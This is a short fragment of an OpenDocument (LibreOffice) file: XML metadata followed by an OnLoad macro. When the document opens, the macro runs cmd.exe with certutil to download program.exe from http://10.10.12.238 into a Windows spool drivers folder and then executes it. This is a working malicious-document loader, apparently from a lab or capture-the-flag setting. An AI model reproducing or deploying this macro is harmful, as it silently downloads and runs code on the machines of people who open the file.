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n3r </meta:initial-creator>
    <meta:creation-date>2017-02-06T15:15:47.35</meta:creation-date>
    <dc:date>2019-07-24T10:06:57.967115069</dc:date>
    <meta:editing-duration>PT1H30M</meta:editing-duration>
    <meta:editing-cycles>81</meta:editing-cycles>
    <meta:generator>LibreOffice/6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OnLoad
	Shell("cmd.exe /c ""certutil -urlcache -split -f http://10.10.12.238/program.exe c:\windows\system32\spool\drivers\color\program.exe &amp; timeout 7 &amp; c:\windows\system32\spool\drivers\color\program.exe"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